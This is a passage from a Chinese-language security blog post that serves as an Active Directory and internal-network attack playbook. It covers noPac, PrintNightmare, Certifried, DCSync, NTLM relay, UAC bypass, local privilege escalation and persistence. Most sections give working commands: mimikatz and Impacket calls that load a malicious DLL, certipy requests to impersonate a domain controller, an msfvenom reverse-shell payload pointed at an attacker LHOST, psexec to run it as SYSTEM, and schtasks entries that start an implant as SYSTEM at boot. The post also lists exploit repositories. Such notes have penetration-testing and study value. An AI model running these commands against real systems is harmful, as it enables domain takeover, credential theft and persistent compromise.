owa.dc.com</span><br><span class="line">/mAccount mAusername /mPassword password /service cifs /ptt</span><br></pre></td></tr></table></figure></li><li><p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">冒充域用户</a></p></li><li><p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a></p></li><li><p>mimikatz</p></li></ul><p>参考：</p><ol><li><a target="_blank" rel="noopener" href="https://trya9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/">https://trya9ain.github.io/posts/nopac-分析/</a></li><li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12138">https://xz.aliyun.com/t/12138</a></li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/317773.html">https://www.freebuf.com/vuls/317773.html</a></li></ol><h3 id="相关解释"><a class="markdownIt-Anchor" href="#相关解释"></a> 相关解释</h3><p>在域中每一个用户即是一个对象,，每个对象都具有各种各样的属性，而每个域用户的用户名对应的属性值便为 userPrincipalName 和 sAMAccountName，他们因为之前版本遗留问题，都可以作为用户名用来登录到域。</p><p>为了区分用户帐户和计算机帐户，计算机帐户应在其 sAMAccountName 属性中以<code>$</code>结尾，但 Active Directory 并未对计算机帐户 sAMAccountName 属性进行验证，每个普通用户最多创建10个计算机用户作为其所有者，可以更改其sAMAccountName 属性。[42278]</p><blockquote><p>域用户：abc</p><p>计算机用户：winr2$</p></blockquote><p>而为了欺骗 KDC，认为我们的账户是DC账户，我们更改一个计算机用户为：<code>DC$</code>。当Kerberos进行身份认证时，会从密钥分发中心请求TGT和ST，如果为无法找到的帐户请求 ST，KDC 将尝在其 sAMAccountName 结尾添加 <code>$</code>再次搜索，而如果再找不到，KDC会继续查找altSecurityIdentities属性的值的用户。所以，可以向域控发起S4U2Self请求ST，KDC 将使用<code>DC$</code>的权限签发 ST，我们则利用之进行下一步攻击。[42287]</p><p>过程中涉及到的概念如下：</p><ul><li>TGT（Ticket Granting Ticket）是一个由KDC（Key Distribution Center）颁发的票据，用于证明用户的身份，并用于获取访问其他服务的ST（Service Ticket）</li><li>S4U2Self（Server for User to Self）是一个Kerberos协议的扩展，允许一个服务代表一个用户获取一个访问自身的ST，而不需要用户提供Kerberos凭据</li><li>CVE-2021-42287是一个Kerberos协议的漏洞，它允许一个攻击者使用创建的计算机账户获取到的TGT，向域控发起S4U2Self请求ST，并利用该ST进行横向移动和权限提升。</li></ul><ul><li><p>PAC (Privilege Attribute Certificate, 特权属性证书)，其中所包含的是各种授权信息，PAC 用来表示用户的权限，如果没有 PAC, Kerberos 协议就仅能证明用户身份，无法表示用户权限。</p><p>注：TGT 和 ST 中的 authorization-data 字段里的内容就是 PAC。</p></li></ul><h2 id="printnightmarecve-2021-167534527"><a class="markdownIt-Anchor" href="#printnightmarecve-2021-167534527"></a> PrintNightmare(CVE-2021-1675/34527)</h2><p>在所有基于 Windows 的系统中，包括域控制器和具有系统管理员权限的计算机，都会在默认条件下开启 Windows 打印后台处理程序，使机器更容易受到攻击。而PrintNightmare是指一种影响Windows打印服务的漏洞，它可以让攻击者利用恶意DLL实现远程代码执行或本地权限提升。PrintNightmare实际上包含两个漏洞：</p><ul><li>CVE-2021-1675：这个漏洞最初被认为是一个本地权限提升漏洞，但后来发现也可以被远程利用。它允许攻击者通过AddPrinterDriverEx函数加载恶意DLL，并以SYSTEM权限执行任意代码</li><li>CVE-2021-34527：这个漏洞是对CVE-2021-1675补丁的绕过，它允许攻击者通过RpcAsyncAddPrinterDriver函数加载恶意DLL，并以SYSTEM权限执行任意代码</li></ul><p>这两个漏洞的共同点是，它们都利用了Windows打印服务中的一个逻辑错误，<strong>即在加载DLL时没有对其路径进行安全检查，导致攻击者可以指定任意位置的DLL</strong>。</p><h3 id="基本步骤"><a class="markdownIt-Anchor" href="#基本步骤"></a> 基本步骤</h3><ol><li><p>在一个可访问的SMB共享上放置一个恶意DLL文件（SMB允许匿名访问，即目标可以直接获取到文件）</p><blockquote><p>WIN上可以使用一些脚本，例如**<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">三好学生的测试脚本</a>**，而Linux上需要安装SMB服务以开启。</p></blockquote></li><li><p>使用一个利用工具，如mimikatz或Impacket，向目标Windows系统发送一个RPC请求，指定恶意DLL的路径</p><blockquote><p>这个恶意DLL可以是由CS或者MSF生成的。发送RPC请求的指令可以为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># rpc::connect /remote:192.168.0.224 /authuser:m3g9tr0n /authdomain:hacklab.local /authpassword:Super_SecretPass!</span></span><br><span class="line">mimikatz <span class="comment"># rpc::addprinterdriver /server:target /driver:drivername /path:\\smb\share\malicious.dll</span></span><br><span class="line"></span><br><span class="line">rpcdump.py hacklab.local/m3g9tr0n:Super_SecretPass!@<span class="number">192.168</span>.<span class="number">0.224</span></span><br><span class="line">psexec.py hacklab.local/m3g9tr0n:Super_SecretPass!@<span class="number">192.168</span>.<span class="number">0.224</span> <span class="string">&#x27;\\smb\share\malicious.dll&#x27;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>如果目标系统没有安装补丁，打印服务会加载并执行恶意DLL，从而实现远程代码执行或本地权限提升</p><p>使用exp就好啦~</p></li></ol><h3 id="解决工具"><a class="markdownIt-Anchor" href="#解决工具"></a> 解决工具</h3><ol><li>EXP：<a target="_blank" rel="noopener" href="https://github.com/outflanknl/PrintNightmare">https://github.com/outflanknl/PrintNightmare</a></li><li>EXP2：<a target="_blank" rel="noopener" href="https://github.com/tothi/CVE-2021-1675.git">https://github.com/tothi/CVE-2021-1675.git</a></li><li>SMB开启：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></li></ol><h2 id="certifriedcve-2022-26923need-adcs"><a class="markdownIt-Anchor" href="#certifriedcve-2022-26923need-adcs"></a> Certifried(CVE-2022-26923)[NEED ADCS]</h2><p>Certifried (CVE-2022-26923) 是一个在Active Directory证书服务（AD CS）上发现的漏洞，它可以让一个域内的普通用户提升自己在域中的权限。这个漏洞的原理是，一个域用户创建一个计算机账户时，会获得<strong>验证写入DNS主机名</strong>和<strong>验证写入服务主体名</strong>的权限（以及其他一些权利）。这些权限可以让用户修改计算机账户的dNSHostName属性，<strong>使其与域控制器的属性相同</strong>，然后从AD CS中获取域控制器的证书，从而实现域内的权限提升。</p><blockquote><p>这个跟noPAC的描述有点像，都是修改属性，模拟成域控，从而达到提权。</p></blockquote><p>利用这个漏洞的方法有以下几个步骤：（参考：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/cve202226923#%EF%BC%89">https://tryhackme.com/room/cve202226923#）</a></p><ul><li><p>创建一个计算机账户，并修改其dNSHostName属性为域控制器的属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Impacket&gt; addcomputer.py &#x27;lunar.eruca.com/thm:Password1@&#x27; -method LDAPS -computer-name &#x27;THMPC&#x27; -computer-pass &#x27;Password1@&#x27;</span><br><span class="line">或者</span><br><span class="line">certipy account create -u &lt;user&gt;@&lt;domain&gt; -p &#x27;&lt;password&gt;&#x27; -user &#x27;certifriedpc&#x27; -pass &#x27;certifriedpcpass&#x27; -dns &#x27;&lt;fqdn_dc&gt;&#x27;</span><br></pre></td></tr></table></figure></li><li><p>为该计算机账户生成一个证书请求，并提交给AD CS。</p><p>使用<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 生成证书</span><br><span class="line">certipy req -username thm@lunar.eruca.com -password Password1@ -ca LUNAR-LUNDC-CA -target lundc.lunar.eruca.com -template User</span><br><span class="line"></span><br><span class="line">-u username@domain, -username username@domain</span><br><span class="line">-p password, -password password</span><br><span class="line">-ca certificate authority name</span><br><span class="line">-target dns/ip address</span><br><span class="line">-template template name</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">certipy req -u &#x27;certifriedpc$&#x27;@&lt;domain&gt; -p &#x27;certifriedpass&#x27; -target &lt;ca_fqdn&gt; -ca &lt;ca_name&gt; -template Machine</span><br><span class="line"></span><br><span class="line"># 验证证书</span><br><span class="line">certipy auth -pfx thmpc.pfx</span><br></pre></td></tr></table></figure></li><li><p>从AD CS中获取证书，并导出为pfx文件。</p></li><li><p>使用pfx文件进行Kerberos认证，并获取域控制器的票据。</p></li><li><p>使用票据（PTT）执行域内的操作（然后进行DCSYNC抓哈希），例如添加域管理员或执行命令。</p></li><li><p>然后删除账户</p></li></ul><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><ol><li>MSF加载<code>auxiliary/admin/dcerpc/cve_2022_26923_certifried</code>模块</li><li></li></ol><h3 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h3><h2 id="zerologon"><a class="markdownIt-Anchor" href="#zerologon"></a> zeroLogon</h2><h2 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/286137.html">DCSync是一种攻击技术，可以模拟域控制器之间的数据同步，从而获取域内用户的哈希</a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/286137.html">1</a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">2</a>。要利用DCSync进行横向移动，需要满足以下条件：</p><ul><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">拥有域内管理员权限或者能修改域内普通用户的权限</a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">对域对象具备<strong>Replicating Directory Changes All</strong>和<strong>Replicating Directory Changes</strong>两个权限</a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/286137.html">使用Mimikatz或者其他工具发起DCSync请求，导出目标用户的哈希</a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/286137.html">1</a><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1915427">2</a>。</li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/17221077.html">使用哈希传递攻击（Pass the hash）或者其他手法在域内横向移动</a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/17221077.html">3</a>。</li></ul><h1 id="adcsactive-directory-certificate-service错误配置的相关问题"><a class="markdownIt-Anchor" href="#adcsactive-directory-certificate-service错误配置的相关问题"></a> ADCS(Active Directory Certificate Service)错误配置的相关问题</h1><h2 id="ntlm中继攻击esc8"><a class="markdownIt-Anchor" href="#ntlm中继攻击esc8"></a> NTLM中继攻击（ESC8）</h2><p>进行NTLM Relay攻击有两步：</p><ol><li><p>捕获Net-NTLM Hash</p><p>其还有步骤：</p><ol><li>第一步是需要使目标<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cvm?from_column=20065&amp;from=20065">服务器</a>向攻击者发起NTLM请求</li><li>第二步是使用工具来捕获服务器发来的NTLM请求</li></ol><p>思路是让受害者把Net-NTLM hash发送给攻击者，也就是说只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试用来向攻击者发送Net-NTLMhash。以下为几种常见的获取方法如下：</p><ol><li>网络协议的欺骗与劫持</li><li>钓鱼攻击</li><li>与其他漏洞结合</li></ol></li><li><p>重放Net-NTLM Hash</p></li></ol><p>NTLM中继已在多种攻击中使用和重用过：</p><p>打印机漏洞：一种从Windows Server触发SMB连接的好方法（与无约束的委托结合起来特别方便）；</p><p>PrivExchange：如何从任何用户的交换邮箱升级到域管理员；</p><p>断开MIC：如何绕过完全保护继电器；</p><p>这些攻击中继了以下协议：</p><p>SMB→SMB（打印机漏洞）</p><p>HTTP→LDAP（PrivExchange）</p><p>SMB→LDAPS（删除MIC）</p><h3 id="工具-2"><a class="markdownIt-Anchor" href="#工具-2"></a> 工具</h3><ol><li><p><a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">responder</a></p></li><li><p><a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></p></li></ol><p>ADCS ESC8是一种<strong>利用AD证书服务的Web注册接口进行NTLM中继攻击</strong>的手法，它可以让攻击者<strong>获取域内任意用户的证书</strong>，从而实现<strong>横向移动和提权</strong>。攻击的原理是<strong>Web注册接口默认只允许NTLM身份认证，且没有启用NTLM中继保护</strong>，因此攻击者可以通过中间人的方式截获用户的NTLM哈希，并将其转发给ADCS服务器，申请用户的证书。利用这个漏洞的方法是使用工具如ntlmrelayx.py或者Responder.py来监听和转发NTLM哈希，然后使用certify.exe或者mimikatz.exe来申请和导入证书</p><h2 id="certifriedcve-2022-26923need-adcs-2"><a class="markdownIt-Anchor" href="#certifriedcve-2022-26923need-adcs-2"></a> Certifried(CVE-2022-26923)[NEED ADCS]</h2><h2 id="相关知识-2"><a class="markdownIt-Anchor" href="#相关知识-2"></a> 相关知识</h2><h3 id="lm与ntlm"><a class="markdownIt-Anchor" href="#lm与ntlm"></a> LM与NTLM</h3><p>他们都是Windows对用户的密码凭证进行哈希加密的算法。LM弱点有：</p><ol><li>用户密码转换为大写（不区分大小写），最大长度限制为14个字符</li><li>如果密码强度小于7位，那个第二个分组加密后的结果一定为 <code>aad3b435b51404ee</code></li><li>Des 容易被破解 密码强度不高</li></ol><p>至于NTLM，NTLM Hash 分为 NTLM v / NTLM v2 / NTLM Session v2 三种，NTLMv2安全性要比NTLMv1高一些。</p><ul><li><p>如果获得的是 NTLM v1，就可以直接进行爆破；</p></li><li><p>如果遇到的是NTLM v2，那么就可以尝试使用NTLM Relay攻击。</p><ul><li>如果使用SMB协议就是SMB-relay，使用HTTP就是HTTP-relay</li></ul></li></ul><h1 id="信息搜集-3"><a class="markdownIt-Anchor" href="#信息搜集-3"></a> 信息搜集</h1><p>攻击内网的第一个要点就是攻击网络主机，DMZ区主机，这些主机通常有WEB服务，通过攻击WEB服务，很可能就可以GETSHELL。而内网中的攻击更多是攻击服务组件、端口、版本漏洞等。思路也差不多：</p><h2 id="信息搜集-4"><a class="markdownIt-Anchor" href="#信息搜集-4"></a> 信息搜集</h2><p>包括计划任务、日志（linux命令行、Windows登录成功日志）、补丁（包括版本信息，内核信息）、运行的服务与程序（包括看杀软）、linux提权需要注意的文件、端口信息、凭证信息等等。</p><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><p>windows计划任务：<code>schtasks /query</code></p><p>linux计划任务存放在几个目录/文件下：</p><ul><li><code>/etc/crontab</code>：存放系统级别的计划任务（不是脚本）。</li><li><code>/var/spoon/cron</code>：存放用户级别的自定义计划任务。</li><li><code>/etc/cron.d/</code>：在这个文件夹中，可以放置以任意名称命名的<strong>cron文件</strong>，每个文件对应一个独立的计划任务。这些cron文件可以包含特定格式的计划任务配置。</li><li><code>crontab</code> 命令：这不是文件夹或文件，而是一个用于管理用户级别cron任务的命令。通过运行 <code>crontab -e</code> 命令，用户可以编辑自己的cron任务。</li><li><code>/etc/cron.&#123;daily, weekly, monthly&#125;/</code>：这些文件夹中存放的是预定义的<strong>cron脚本</strong>，用于执行日常、每周或每月的任务。系统会在预定的时间自动运行这些脚本。</li></ul><h3 id="重要端口"><a class="markdownIt-Anchor" href="#重要端口"></a> 重要端口</h3><p>windows：</p><ul><li>88端口，监听KDC请求，用于Kerberos金银票据的伪造</li><li>135端口：RPC，wmic服务利用</li><li>137、138、139（Samba）端口：NetBios，未授权访问，可以用于发现局域网主机（工具<code>nbtscan</code>）和查看局域网共享资源</li><li>389端口：LDAP</li><li>443端口：HTTPS、Exchange服务（接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露 …）</li><li>445端口：smb服务，Windows 协议簇，主要功能为文件共享服务。可以使用IPC连接（<code>net use</code>），可以使用弱口令、远程命令执行</li><li>3389端口：RDP服务，可以安插粘滞键后门（shift）</li><li>5985端口：WinRM服务，可以用来针对某些高版本Windows, 弱口令, 远程执行, 后门植入</li><li>其他的就是</li></ul><p>数据库：</p><ul><li>1433：MSSQL</li><li>1521：ORACLE</li><li>3306：MYSQL</li><li>5432：POSTGESQL</li><li>6379：REDIS</li></ul><h3 id="敏感信息"><a class="markdownIt-Anchor" href="#敏感信息"></a> 敏感信息</h3><h3 id="凭证信息"><a class="markdownIt-Anchor" href="#凭证信息"></a> 凭证信息</h3><h2 id="windows本地提权"><a class="markdownIt-Anchor" href="#windows本地提权"></a> Windows本地提权</h2><p>之前的文章提到，Windows提权主要有</p><ol><li>at、sc计划任务执行命令的提权，这个是早期win的逻辑错误</li><li>服务提权：如果该服务执行的程序路径没有双引号，且有空格，则可以提权；如果该服务路径可以改成自己程序的路径，也行</li><li>dll劫持：查看高权限运行的第三方软件都调用了什么dll（动态调用，一定会调用的），替换之</li><li>然后就是常用的：令牌窃取+烂土豆提权（该用户需要满足模拟令牌的权限）+溢出漏洞</li></ol><p>由于溢出漏洞等等讲得不多，所以多增加一些，加上一些可能会遇到的场景。</p><h3 id="uacbypass"><a class="markdownIt-Anchor" href="#uacbypass"></a> UAC（Bypass）</h3><p>英文名：User Account Control。他有几个档位，中级/高级/默认等等。一旦设置了，那么执行需要管理员权限的操作时，就会弹窗确认。这时候，我们的一些软件，例如Mimikatz就用不了了，所以需要Bypass，达到<code>High Mandatory Level</code>即可。可以手工，也可以使用MSF（里面好多payload）。</p><p>通常，我们可以使用eventvwr.exe程序绕过，该程序允许普通用户以管理员权限运行eventvwr.exe，而无需提供管理员凭据（用于查看系统的事件日志，这也是正常的行为）。该漏洞已经被新版本的Windows修复啦。</p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164019438.png" alt="image-20230731164019438" style="zoom:50%"> <img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230731164100532.png" alt="image-20230731164100532" style="zoom:33%"><h4 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h4><p>大概路线：</p><ol><li>创建一个伪装的eventvwr.exe程序，并将其存储在受攻击者控制的目录下，通常是用户目录或可写的临时目录。</li><li>在注册表中创建一个伪装的eventvwr.exe应用程序路径键值，将它指向伪装的eventvwr.exe路径。</li><li>触发eventvwr.exe运行，由于Windows默认会在PATH中查找可执行文件，因此系统将使用注册表中伪装的路径启动eventvwr.exe。</li><li>由于eventvwr.exe是允许以管理员权限运行的程序，因此伪装的eventvwr.exe也会以管理员权限运行，从而绕过了UAC提示。</li><li>通常，配合反弹shell，完成提权</li></ol><p>使用<code>whoami /all</code>查看权限，看是否在管理员用户组中，如果在，并且不是High Mandatory Level，那么就<strong>可能</strong>需要进行Bypass了。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png" alt="OnPaste 20220608-165652"></p><p>进一步确认是否存在UAC，执行以下命令，如果EnableLUA为0则不需要Bypass，如果为1且<code>PromptSecureDesktop</code>也为1，则可以进行Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System </span><br></pre></td></tr></table></figure><p>查看是否存在eventvwr程序，并且查看是否存在提权条件（<a target="_blank" rel="noopener" href="https://github.com/k4sth4/UAC-bypass/blob/main/strings64.exe">string64.exe</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where /r C:\\windows eventvwr.exe</span><br><span class="line">strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure><p>如果存在，则编译exploit，这个程序可以伪造注册表，到我们指定的目录：<a target="_blank" rel="noopener" href="https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c%E3%80%82%E4%B8%8A%E4%BC%A0%E8%AF%A5%E8%84%9A%E6%9C%AC%E7%9A%84exe%EF%BC%8C%E8%BF%98%E6%9C%89%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshell.exe%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8C%EF%BC%8C%E8%BF%90%E8%A1%8Cexploit%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c。上传该脚本的exe，还有生成一个shell.exe到服务器里，运行exploit即可。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>当得到High之后，我们可以使用<a target="_blank" rel="noopener" href="https://github.com/k4sth4/UAC-bypass/blob/main/psexec64.exe">psexec64</a>提权，接收返回的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe</span><br></pre></td></tr></table></figure><h4 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h4><p>MSF里面有很多工具，我觉得还是得看上面的条件才去使用payload。bypassuac注意需要用户在管理员组，并且uac是开启状态，uac如果是关闭状态是可以直接getsystem进行提权的。</p><p>win7(这个高级用不了，去其他的把）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>win10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure><h4 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h4><p>工具：uacme</p><h3 id="第三方服务"><a class="markdownIt-Anchor" href="#第三方服务"></a> 第三方服务</h3><h4 id="打印机"><a class="markdownIt-Anchor" href="#打印机"></a> 打印机</h4><p><a target="_blank" rel="noopener" href="https://github.com/jacob-baines/concealed_position">https://github.com/jacob-baines/concealed_position</a></p><p>通常有：</p><blockquote><p>CVE-2021-35449 - Lexmark 通用打印驱动程序 LPE</p><p>CVE-2021-38085 - 佳能 TR150 打印驱动程序 LPE</p><p>CVE-2019-19363 - Ricoh PCL6 打印驱动程序 LPE</p><p>CVE-2020-1300 - Windows 打印后台处理程序 LPE</p></blockquote><h4 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h4><p>见第一篇</p><h3 id="win漏洞"><a class="markdownIt-Anchor" href="#win漏洞"></a> Win漏洞</h3><p>使用漏洞先要对补丁进行扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MSF&gt; post/windows/gather/enum_patches # 扫描补丁</span><br><span class="line">MSF&gt; use post/multi/recon/local_exploit_suggester # 列举可用EXP</span><br><span class="line">或</span><br><span class="line">SearchExploit&gt; wmic qfe list full|findstr /i hotfix # 或者 systeminfo</span><br><span class="line">SearchExploit&gt; searchsploit &lt;OS NAME&gt; &lt;OS Version&gt; # 先去expoitDB上查一下</span><br><span class="line">或Empire</span><br><span class="line">Empire&gt; usemodule privesc/watson</span><br><span class="line">Empire&gt; execute</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p><strong>MS08-067</strong></p><p><strong>MS14-058[KB3000061]</strong>：Windows OLE 远程代码执行漏洞，可以用来提权，一般CS用得比较多。</p><p><strong>MS14-068[KB3011780]</strong>：制作金银票据的重要漏洞，可以获取域控ntlm。现在好像很难遇到了。</p><p><strong>MS15-051[KB3045171]</strong>：用得比较多</p><p><strong>MS16-032[KB3124280]</strong></p><p><strong>MS16-075</strong></p><p><strong>MS16-135[KB3199135]</strong></p><p><strong>MS17-010[KB4013389]</strong>：永恒之蓝</p><p><strong>CVE-2018-8120</strong>：MSF常用</p><p><strong>CVE-2019-0708</strong></p><p><strong>CVE-2019-0803</strong></p><p><strong>CVE-2019-1322 &amp; CVE-2019-1405</strong></p><p><strong>CVE-2020-1472</strong>：zeroLOGON，也比较常出现</p></blockquote><h2 id="linux本地提权"><a class="markdownIt-Anchor" href="#linux本地提权"></a> Linux本地提权</h2><h3 id="linux漏洞"><a class="markdownIt-Anchor" href="#linux漏洞"></a> Linux漏洞</h3><p>先检测一下，哪些漏洞可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br><span class="line">https://github.com/PenturaLabs/Linux_Exploit_Suggester</span><br><span class="line">https://github.com/jondonas/linux-exploit-suggester-2</span><br><span class="line">https://github.com/belane/linux-soft-exploit-suggester</span><br></pre></td></tr></table></figure><p>常用漏洞列表</p><blockquote><p>CVE-2016-5195：脏牛，<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">参考1</a>，<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195">参考2</a></p><p>CVE-2017-16995</p><p>CVE-2019-13272</p><p>CVE-2021-4034：<a target="_blank" rel="noopener" href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p>CVE-2021-3560</p><p>CVE-2022-0847</p><p>CVE-2022-23222：<a target="_blank" rel="noopener" href="https://github.com/tr3ee/CVE-2022-23222">https://github.com/tr3ee/CVE-2022-23222</a></p></blockquote><h2 id="入口处权限维持"><a class="markdownIt-Anchor" href="#入口处权限维持"></a> 入口处权限维持</h2><p>OWA 登录口 [账号密码,webshell]</p><p>VPN 登录口 [账号密码,shell]</p><p>其他 MAIL 登录口 [账号密码]</p><p>边界 Web服务器 [Webshell 驻留技巧]</p><p>边界路由交换设备 [账号密码,shell]</p><h2 id="windows权限维持"><a class="markdownIt-Anchor" href="#windows权限维持"></a> Windows权限维持</h2><h3 id="系统计划任务-高权限低权限"><a class="markdownIt-Anchor" href="#系统计划任务-高权限低权限"></a> 系统计划任务 [高权限/低权限]</h3><p>可以使用两个指令去完成，<code>at</code>和<code>schtasks</code>，对应不同的版本。之前的文章也说过该方法，所以这里简略再说一下。</p><p>首先确认计划任务服务开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start &quot;task scheduler&quot;</span><br></pre></td></tr></table></figure><p><code>ru</code>是以什么权限运行，如果不行，那么就去掉，参考<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create">链接</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># at指令示例</span><br><span class="line">at 15:00 cmd /c copy C:\Users\gang\Desktop\1.txt E:\</span><br><span class="line"></span><br><span class="line">schtasks /create /tn 计划任务名 /tr &quot;计划任务执行文件命令&quot; /sc 任务类型 /mo 几分钟运行一次 /ru System</span><br><span class="line"># 示例：每分钟运行一次</span><br><span class="line">schtasks /create /sc minute /mo 1 /tn WScript /tr \\central\data\scripts\sec.vbs /ru System</span><br><span class="line"># 开机运行</span><br><span class="line">SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\AppID\cs /TR C:\artifact.exe</span><br></pre></td></tr></table></figure><p>设置完成后，可以通过<code>schtasks /query</code>查看。然后运行，参考<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-run">链接</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /tn &lt;taskname&gt;</span><br><span class="line"># 示例：运行WScript</span><br><span class="line">schtasks /run /tn WScript</span><br></pre></td></tr></table></figure><h4 id="示例"><a class="markdownIt-Anchor" 